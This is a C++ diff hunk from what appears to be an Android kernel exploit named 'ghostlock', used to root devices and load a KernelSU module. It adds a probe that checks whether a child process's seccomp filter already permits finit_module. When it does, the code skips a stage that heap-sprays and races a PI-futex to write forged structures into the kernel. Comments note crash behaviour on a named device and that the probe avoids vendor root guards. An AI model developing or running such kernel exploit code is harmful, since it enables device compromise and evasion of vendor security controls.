@@ -260,6 +260,28 @@ namespace ghostlock::session::backend {
                 return true;
             }
 
+            /* Pre-W3 probe: W3 exists to clear the child's seccomp filter so
+             * it can finit_module the KernelSU module. Every W3 round is a
+             * heap spray plus a PI-futex race that writes forged structures
+             * into the kernel, and on the Titan 2 those extra rounds are
+             * where the __secure_computing oops came from (2026-10-22: the
+             * app route ran 4 rounds, the adb/shell route 2).
+             *
+             * The child already has a forked finit_module probe: it reports a
+             * normal errno when the call reached the kernel and SIGSYS /
+             * EPERM / ENOSYS when a filter is in the way. One fork, no kernel
+             * writes. When the probe says the call already gets through, both
+             * W3 writes are unnecessary -> skip them.
+             *
+             * The probe is a finit_module(0,0,0) on a null path: the kernel
+             * rejects it long before the module-load hook, so no vendor root
+             * guard sees it. */
+            if (victim::probe_child_seccomp_allowed_stage(&w2_context)) {
+                pr_success("child seccomp already permits finit_module; skipping W3\n");
+                seccomp_ok = 1;
+                return true;
+            }
+
             constexpr bool exact_target = M::w3_exact_target;
             victim::w3_stage_context w3_context = {
                 .pipes = pipes,
